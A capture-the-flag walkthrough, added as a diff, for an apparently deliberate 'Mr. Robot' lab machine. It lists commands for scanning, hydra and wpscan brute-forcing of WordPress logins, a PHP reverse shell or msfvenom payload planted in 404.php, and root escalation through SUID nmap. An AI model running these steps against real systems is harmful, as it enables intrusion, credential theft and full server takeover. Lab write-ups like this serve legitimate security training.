@@ -1,0 +1,109 @@
+netdiscover -i wlan0    #To get the ip address of the ctf machine.
+  > 192.168.43.23 is the ip address of the ctf machine
+
+nikto -h "ip address"    #for vulnerability scanning
+   > Shows robots.txt file
+   > Shows wordpress installation
+
+Go to browser and type: 192.168.43.23/robots.txt      
+   > Show two file:
+      1. fsocity.dic    #dictionary_file
+      2. key-1-of-3.txt   #First_flag
+   
+wget 192.168.43.23/fsocity.dic    #download the dictionary file
+
+Go to the browser and type: 192.168.43.23/wp-admin    #wordpress has a login page associated with "wp-admin"
+  
+Now, sort the dictionary file using command:    cat fsocity.dic | sort -u | uniq > wordlist.dic 
+    > sort -u (to sort data in ascending order)
+    > uniq (remove duplicates in the file)
+    
+We need to get a HTTP-POST request, for that:
+    > Open BurpSuite
+    > Turn on the intercept
+    > Go to the login page and type random username (test) and password (123)
+    > Now, go back to BurpSuite and look for fields: log (username) , pwd (password) and wp-submit.
+Now, we need to test all the words which are present in the fsocity.dic file to find the username hidden in the file.
+For that we need to check all the words with the random password until wordpress gives us a response telling that this user exists and the password entered is wrong.
+We'll be using Hydra cracking tool to check the username.
+
+hydra -V -L fsocity.dic -p 123 192.168.43.23 http-post-form '/wp-login.php: log=^USER^&pwd=^PASS^&wp-submit=LOG+IN:F=Invalid username'
+
+We got the username "Elliot". Now we'll bruteforce the password using "wpscan"
+
+wpscan --url 192.168.43.23 --wordlist /root/wordlist.dic --username Elliot          #old_command
+wpscan --url 192.168.43.23 --passwords "password_file" --usernames "username"       #new_command
+
+We get password ER28-0652 and username Elliot. Now, go to the login page and type username and password. You will be inside wordpress.
+Go to users and check whether you are administrator or not. In this case, Elliot is an administrator which means you can add plugins.
+
+Now, we need to exploit the wordpress server and for that we need to install a reverse shell.
+  We can create a reverse shell by < msfvenom > command or we can downlaod it from pentestmonkey.net
+  
+First Method: Downloading the php reverse shell
+
+http://pentestmonkey.net/tools/php-reverse-shell/php-reverse-shell-1.0.tar.gz
+
+  > Extract the tar file and open it in a text editor.
+  > Change the ip address and port accordingly.
+  > Copy the entire code and paste it in 404.php plugin
+  
+nc -lvp 1234    #netcat command use to listen on port 1234 (use port mentioned in the php file)
+  
+curl http://192.168.43.23/404.php     #To get reverse shell using the payload
+  
+You will get a shell. Type command < id > to check the id, you are Daemon.
+  To spawn a shell, use command (tty)
+  
+python -c 'import pty; pty.spawn("/bin/sh")'
+  
+Type commands in the shell:
+    > ls
+    > cd /home
+    > cd robot
+You will get two files here:
+    1. key-2-of-3.txt     #Second_flag (permission denied)
+    2. password.raw-md5     #md5_encryption_password
+      
+After decrypting the hash in the password.raw-md5 file, we get password - abcdefghijklmnopqrstuvwxyz
+
+su - robot
+  > enter password
+  > check id
+You can access key-2-of-3.txt.
+
+Now, we need to perform privilege escalation to get the third flag.
+We need to search for files, scripts or programs that can be accessed and we can use interactive mode. For that, we need to find files with superuser access.
+
+find / -perm -4000 2>/dev/null
+  > We found nmap
+Type commands:
+  > nmap --interactive
+  > !sh
+  > id
+  > cd /root
+  > ls
+After listing, you get two files:
+    1. key-3-of-3.txt     #Third_flag
+    2. firstboot_done
+    
+Second method: Using Metasploit
+
+msfvenom -p php/meterpreter/reverse_tcp lhost "ip address" lport "port number" -f raw       #create_payload
+
+Copy the code (payload) and paste it in 404.php template in wordpress.
+
+Now, open Metasploit 
+    > msfconsole
+And type commands:
+    > use exploit/multi/handler
+    > set payload php/meterpreter/reverse_tcp
+    > set lhost "ip address"
+    > set lport "port number"
+    > exploit
+    
+Reload the path:  http://192.168.43.23/wp-content/themes/twentyfifteen/404.php
+  You will get the shell access.
+ 
+After getting the shell access the process is same as in the first method.
+
